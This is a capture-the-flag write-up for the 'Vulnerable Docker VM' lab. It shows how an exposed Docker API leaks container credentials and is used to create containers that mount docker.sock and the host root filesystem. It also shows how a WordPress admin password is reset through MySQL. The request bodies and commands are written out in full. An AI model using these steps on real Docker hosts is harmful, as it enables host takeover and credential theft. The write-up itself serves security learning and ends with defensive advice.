# Vulnerable-Docker-VM
This is a writeup for the EASY mode of the Down By The Docker CTF by [notsosecure.com](https://www.notsosecure.com/vulnerable-docker-vm/)



## First things first

We got an IP of the server - so lets scan it with nmap:

```bash
nmap -T4 -p- -oN Documents/ports 192.168.253.129
```

Reviewing the results we got:

|PORT    | STATE |SERVICE|
|--------|-------|-------|
|22/tcp  | open  |ssh|
|2375/tcp| open  |docker|
|8000/tcp| open  |http-alt|

The 8000 port is a wordpress site, but we're interested, right now, on the docker's one.

HTTP OPTIONS request to port 2375, reveal:
```bash
Api-Version → 1.30
...
Server → Docker/17.06.0-ce (linux)
...
```

This is Docker API version 1.30. Here you can find its documentation:

https://docs.docker.com/engine/api/v1.30/


OK, apperantly the server expose to us the docker deamon itself, so our first goal, to reach any kind of control, is fullfilled. 

Next, lets check this out.

**A small side note**, for everyone who's not familiar with the docker API: Now we realize that we probably passed the main vulnerability: The docker deamon is the heart of this server and challenge - if we can send it commands - we won. So this is not really a CTF per se, it is more kind of navigating ourself through the docker configuration and misconfiguration.



## Checking what we're dealing with
This is my first time with the docker API but I do know a little bit about docker and docker commands, so let see if we can get anything special - lets try to get a list of the containers. I used Postman to send HTTP requests:
```
http://192.168.253.129:2375/containers/json
```
And indeed, we get a list of the running containers inside the server:

| Name                  | Image                      |
|-----------------------|----------------------------|
| content_wordpress_1   | wordpress:latest           |
| content_db_1          | mysql:5.7                  |
| content_ssh_1         | jeroenpeeters/docker-ssh   |


We can now try to inspect each container to search for any interesting variables:

#### content_wordpress_1:

```
http://192.168.253.129:2375/containers/content_wordpress_1/json
```

```javascript
{
...
"HostConfig": {
        ...
        "PortBindings": {
            "80/tcp": [
                {
                    "HostIp": "",
                    "HostPort": "8000"
                }
            ]
        },
        ...
}
...
"Env": [
            ...
            "WORDPRESS_DB_HOST=db:3306",
            "WORDPRESS_DB_USER=wordpress",
            "WORDPRESS_DB_PASSWORD=WordPressISBest",
            ...
        ],
...
}
```

Enviroment variables holds several key values necessary for the containers' service. Each container type has its own variables. Here we can see the site database host, its user and password.

We'll get to the HostConfig shortly.


#### content_db_1:

```
http://192.168.253.129:2375/containers/content_db_1/json
```

```javascript
{
...
"Env": [
            ...
            "MYSQL_ROOT_PASSWORD=Peaches123",
            "MYSQL_PASSWORD=WordPressISBest",
            "MYSQL_USER=wordpress",
            "MYSQL_DATABASE=wordpress",
            ...
        ],
...
}
```

Each mysql container needs to be initialized with root password, this variable is mandatory. Also we can see here that the container was created with the wordpress database and user.

#### content_ssh_1:

```
http://192.168.253.129:2375/containers/content_ssh_1/json
```

```javascript
{
...
"Env": [
            "AUTH_MECHANISM=noAuth",
            "CONTAINER=content_db_1",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "CONTAINER_SHELL=bash",
            "KEYPATH=./id_rsa",
            "PORT=22",
            "HTTP_ENABLED=true",
            "HTTP_PORT=8022"
        ],
...
}
```

This is interesting, seemingly we have a SSH container that connects us to the mysql container. The `HTTP_ENABLED` and `HTTP_PORT` variables are also interesting - do we have a SSH web API?

Checking http://192.168.253.129:8022/ reach us nowhere - why it's not working? 

Nor the SSH 22 port: It seems as if no authentication is needed, according to the `AUTH_MECHANISM` - but we still get:
```bash
PS C:\> ssh 192.168.253.129
user@ad@192.168.253.129's password:
Permission denied, please try again.
```

So, what's going on?

## Few seconds on docker's ports
Remember `HostConfig` we've noticed in the wordpress container's inspect request? We can see there a value named `PortBindings`. This value tells us that the docker deamon binds the host machine's 8000 port to the container's 80 port. Every request sent to the host machine to port 8000 is tunneled to port 80 on the wordpress container. By default, all ports on the container are isolated from the outside, and we need explicitly to bind a port for it to be seen from the outside. This is why we can view the site when we go to http://192.168.253.129:8000. 

On the content_ssh_1 container, the `PortBindings` is empty - so no external request is tunneled to this container. This is explains the Premission denied of the SSH connection - this is the SSH of the host machine, which, for a change - is locked.

OK, we want to bind the SSH port so we can connect to the mysql container. But, this kind of binding can only be done when the container is initiated. This is mean that we need to get our hands a little bit dirty and create and initiate a new container on the remote host.

## Let's get dirty
The creattion and initiation of containers with the Docker API is quite easy - we just need to know what kind of container and what kind of environment variables we need. 

The image of the SSH container is `jeroenpeeters/docker-ssh` - so we better read it's documentation and understand what is needed for it to work. You can find it over [here](https://hub.docker.com/r/jeroenpeeters/docker-ssh/).

Long stroy short (although the long one is not so long):
- The main idea of this container is to create a SSH connection to containers that does not come with one originally.
- It doing so by using the EXEC docker command to open a bash in the target container and tunnel it to the SSH connection through the external port, outside.
- In order to do so, the SSH container needs to be initiated with the docker.sock mounted to it. Docker.sock is the socket which the docker deamon is listen to - to get commands.
- Mounting means that the socket itself (or whatever else you're mounting) is connected from the host machine directly to a  certain path in the container. This means that who ever have access to the container has access to the host machine. Later, we're going to use this feature to scan the host machine files.
- We need to remember to bind some external ports to port 22 and port 8022 on the container - so we can connect to it.
- The 8022 port is for a Web API - which is very nice feature of this image.

We know, more or less, what configuration we needs to connect the SSH container to the DB container. Now we need to look at the Docker API to see how we need to configure it. You can see that it is pretty straight forward:

POST request to:
```
http://192.168.253.129.98:2375/containers/create?name=content_ssh_2
```

With body:
```javascript
{
	"Image": "jeroenpeeters/docker-ssh",
	
	"Name" : "content_ssh_2",
	
	"HostConfig": {
		"Binds": [
			"/var/run/docker.sock:/var/run/docker.sock:rw",
			"/usr/bin/docker:/usr/bin/docker:rw"
			],
		"PortBindings": {
			"22/tcp": [
			    {
				"HostIp": "0.0.0.0",
				"HostPort": "2220"
			    }
			],
					"8022/tcp": [
			    {
				"HostIp": "0.0.0.0",
				"HostPort": "8822"
			    }
			]
		    }
	},
	
	"Env": [
            "AUTH_MECHANISM=noAuth",
            "CONTAINER=content_db_1",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "CONTAINER_SHELL=bash",
            "KEYPATH=./id_rsa",
            "PORT=22",
            "HTTP_ENABLED=true",
            "HTTP_PORT=8022"
			]
}
```

Here, we ask docker to bind the host's port 2220 to port 22 of the `content_ssh_2` container, and host's port 8822 to port 8022. All the env. object is taken from the inspection of the docker-ssh container (except changing the name of the target container).


Upon successful creation we will recieve the following response:
```javascript
{
    "Id": "a4ca050cf4e32d01d3c67c83c52eef4fb03f03151de0982230791a9866cd9933",
    "Warnings": null
}
```
We can reference a container by its Id or by its name.

After creating the container we need to start it, otherwise it's just an image sitting there, doing nothing but aging:
POST request to:
```
http://192.168.253.129:2375/containers/content_ssh_2/start
```
Status 204 means everything went alright.

Just to make sure we can check the containers list:
```
http://192.168.253.129:2375/containers/json
```

OK, and now we can test it:
```
http://192.168.253.129:8822/
```

And we should get:

<center><img alt="content_db_1 ssh web API" src="files/images/db_1-ssh.png" /></center>

This is the web API for the ssh connection of the ssh image we're using. Let's test this:

```bash
/ $ mysql -u root -p
Enter password:
```

As for the password, we're using what we've got from the inspection of the db container: `Peaches123`. And it worked!
```
Welcome to the MySQL monitor.  Commands end with ; or \g.   
Your MySQL connection id is 5
Server version: 5.7.19 MySQL Community Server (GPL)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.        

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective       
owners.        

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                           

mysql> 
```

## Finding the first flag

Feel free to roam through the tables and databases - nothing too interesting, except this table:
```mysql
mysql> select * from wordpress.wp_users;                                                                                                                                                                                                                                                  
+----+------------+------------------------------------+---------------+----------------------------+----------+---------------------+---------------------+-------------+--------------+                                                                                                 
| ID | user_login | user_pass                          | user_nicename | user_email                 | user_url | user_registered     | user_activation_key | user_status | display_name |                                                                                                 
+----+------------+------------------------------------+---------------+----------------------------+----------+---------------------+---------------------+-------------+--------------+                                                                                                 
|  1 | bob        | $P$B0VtNkHE4cR4TTnEMypX1XyR3tu3z1. | bob           | vulndocker@notsosecure.com |          | 2017-08-19 04:35:41 |                     |           0 | bob          |                                                                                                 
+----+------------+------------------------------------+---------------+----------------------------+----------+---------------------+---------------------+-------------+--------------+                                                                                                 
1 row in set (0.01 sec)  
```

Which means that we could get into the wordpress account, if only we knew what hash we should put in the user_pass column.

That required a little bit of a research but: Wordpress, in the past, used MD5 hash algorithm but eventualy changed it in order to make accounts more secure. But, for backward compatability, it's still checking for MD5 hash - if it finds that that's the case, it gets you in but, on the way, change the hash to the more secure one.

For us, it means - we only need to use MD5:

```mysql
mysql> UPDATE wordpress.wp_users SET user_pass=MD5("password") WHERE ID=1; 
```

And that's it. We have access to the admin account of the site. 

On wordpress, the login page is on: /wp-admin. Use `bob` as username and `password` as the password.

```
http://192.168.253.129:8000/wp-admin/
```

After accessing it, you can find immediately the first flag `flag_1` under Drafts.

```
2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998

good job finding this one. Now Lets hunt for the other flags

hint: they are in files.
```

## Finding the second flag

We have some clue as to what to be looking for - a file. Easy, right?

```bash
/ $ find . -name *flag*
```

Nothing.

Well, if you remeber we have two more containers: `content_ssh_1` and `content_wordpress_1` - maybe it's there?

Trust, it's not. You can search for yourself by creating new ssh container and connects it to the `content_wordpress_1` container. This is to be done by only changing the `CONTAINER=content_wordpress_1` environment variable.

OK, so if it's not on any of the containers, where can it be? Mmmmmm well ... all of these docker containers needs to run on a host, right? maybe it's there? But how to get access to the host's file system?

Remeber the mounting thing? We need to mount the file system itself to some (new) container, connects to it through shh container, and than, we'll have access to the host's file system itself:

Post request to:

```
http://192.168.253.129:2375/containers/create?name=content_wordpress_2
```

With body:
```javascript
{
	"Image": "wordpress",
	
	"Name" : "content_wordpress_2",
	
	"HostConfig": {
			"Binds": [
				"/:/host-files:rw"
				]
	}
}
```

I used here the wordpress image. It doesn't really matter - we only need that the host machine will have that image already. We also need to be sure that the new container will have bash in it (these are images - it's not obvious what is installed on them) for the ssh container.

The ssh container is straight forward 'Copy-Paste' from the previous one - just change the names and ports where is needed.

In the new container:
```bash
/var/www/html $ cd / 
/ $ ls
bin  boot  dev  etc  home  host-files  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Impress with the `host-files` directory. This is the host machine file system root!
```bash
/ $ cd host-files
/host-files $ ls
bin  boot  dev  etc  flag_3  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz
```

And watch! We've found the second flag!

```bash
/host-files $ cat flag_3
d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6

Awesome so you reached host

Well done

Now the bigger challenge try to understand and fix the bugs.

If you want more attack targets look at the shadow file and try cracking passwords :P

Thanks for playing the challenges we hope you enjoyed all levels

You can send your suggestions bricks bats criticism or appreciations
on vulndocker@notsosecure.com  
```

## Some conclusions

The Root Of All Evil here was the docker.sock exposed to the world through port 2375. This is extremely a bad thing to do. Docker.sock is the socket which the docker deamon is listening to. Since the docker deamon is running as root - port 2375 has, effectively, root priviliges on the host machine - the CTF ended before it even began...

The second bad habbit, and much more common, is mounting the docker.sock to the containers. If you'll try to solve the Hard mode \[SPOILER ALERT] - you can't use there the exposed port. So the point here is to try and get access to some container and realised that the docker.sock is mounted to it - and now, you have your root access to the host machine.

Mounting the docker.sock to containers is common since there are plenty of things that you would want to achive with it: Being aware of other containers around, get access to their environment variables, communicate with dockerd (as with the docker-ssh container) etc. Nonetheless it is bad practice and you should always find workaround. One way is to isolate the process which is to communicate with dockerd on another container which is not accessible through the network (for example, look at this guy suggestion: https://github.com/containous/traefik/issues/4174).
